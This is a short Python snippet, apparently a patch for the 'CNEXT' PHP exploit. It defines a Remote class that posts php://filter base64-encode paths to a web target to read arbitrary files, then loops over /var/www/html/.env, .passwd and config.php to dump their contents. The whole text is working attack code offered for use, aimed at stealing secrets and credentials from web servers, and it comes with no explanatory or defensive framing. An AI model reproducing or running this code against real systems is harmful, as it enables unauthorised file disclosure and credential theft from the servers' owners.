## REPLACE THE REMOTE CLASS CODE IN THE BEGINNING WITH THIS CODE:
import base64 as pybase64
from requests import Session, Response

class Remote:
    """A helper class to send the payload and download files."""

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        return self.session.post(self.url, data={"file": path})

    def download(self, path: str) -> bytes:
        encoded_path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(encoded_path)
        match = re.search(b"File contents: (.*)", response.content, flags=re.S)
        if not match:
            raise ValueError("Could not extract file contents from response.")
        return pybase64.b64decode(match.group(1))





## REST OF THE CNEXT CODE GOES HERE:


## ADD THIS TO THE VERY BOTTOM OF YOUR CNEXT EXPLOIT CODE:
remote = Remote("http://127.0.0.1:8080") #change this according to your url

for path in ["/var/www/html/.env", "/var/www/html/.passwd", "/var/www/html/config.php"]:
    try:
        data = remote.download(path)
        print(f"\nContents of {path}:\n{data.decode()}")
    except Exception as e:
        print(f"Failed to read {path}: {e}")

